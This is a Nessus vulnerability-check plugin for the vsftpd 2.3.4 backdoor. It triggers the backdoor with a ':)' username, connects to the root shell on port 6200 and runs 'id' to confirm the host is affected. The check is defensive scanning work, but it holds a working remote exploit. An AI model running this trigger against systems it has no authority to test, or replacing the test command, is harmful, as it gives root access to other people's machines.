#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(55523);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2014/12/26 13:58:58 $");

  script_bugtraq_id(48539);
  script_osvdb_id(73573);
  script_xref(name:"EDB-ID", value:"17491");

  script_name(english:"vsftpd Smiley Face Backdoor");
  script_summary(english:"Attempts to trigger and connect to the backdoor.");

  script_set_attribute(attribute:"synopsis", value:
"The remote FTP server contains a backdoor, allowing execution of
arbitrary code.");
  script_set_attribute(attribute:"description", value:
"The version of vsftpd running on the remote host has been compiled
with a backdoor. Attempting to login with a username containing :)
(a smiley face) triggers the backdoor, which results in a shell
listening on TCP port 6200. The shell stops listening after a client
connects to and disconnects from it.

An unauthenticated, remote attacker could exploit this to execute
arbitrary code as root.");
  script_set_attribute(attribute:"see_also", value:"http://pastebin.com/AetT9sS5");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?abcbc915");
  script_set_attribute(attribute:"solution", value:
"Validate and recompile a legitimate copy of the source code.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'VSFTPD v2.3.4 Backdoor Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  
  script_set_attribute(attribute:"vuln_publication_date",value:"2011/07/03");
  script_set_attribute(attribute:"patch_publication_date",value:"2011/07/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/07/06");
  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2011-2014 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl", "find_service2.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ftp", 21);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");

backdoor_port = 6200;
if (known_service(port:backdoor_port))
  audit(AUDIT_SVC_ALREADY_KNOWN, backdoor_port);

port = get_ftp_port(default:21);
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

if (report_paranoia < 2)
{
  banner = get_ftp_banner(port:port);
  if (isnull(banner))
    audit(AUDIT_NO_BANNER, port);
  if ('vsFTPd 2.3.4' >!< banner)
    audit(AUDIT_NOT_LISTEN, 'vsftpd 2.3.4.', port);
}

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

# sending a smiley face in the username triggers the backdoor.
# vsftpd rejects usernames that don't start with alphanumeric chars
user = strcat(unixtime(), ':)');
pass = rand_str(length:8);
ftp_authenticate(socket:soc, user:user, pass:pass);

soc2 = open_sock_tcp(backdoor_port);
if (!soc2)
{
  close(soc);
  exit(0, 'Failed to open a socket on port '+backdoor_port+' (appears the host is not affected).');
}

cmd = 'id';
cmd_pat = 'uid=[0-9]+.*gid=[0-9]+.*';

send(socket:soc2, data:cmd + '\n');
res = recv_line(socket:soc2, length:1024);
close(soc);
close(soc2);

if (strlen(res) == 0) exit(1, "Failed to read the command output after sending the exploit to the FTP server on port "+port+".");
if (egrep(pattern:cmd_pat, string:res))
{
  if (report_verbosity > 0)
  {
    report =
      '\nNessus executed "' + cmd + '" which returned the following output :\n\n' +
      res;
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else exit(1, "Unexpected response from '" + cmd + "' command received after sending the exploit to the FTP server on port "+port+".");
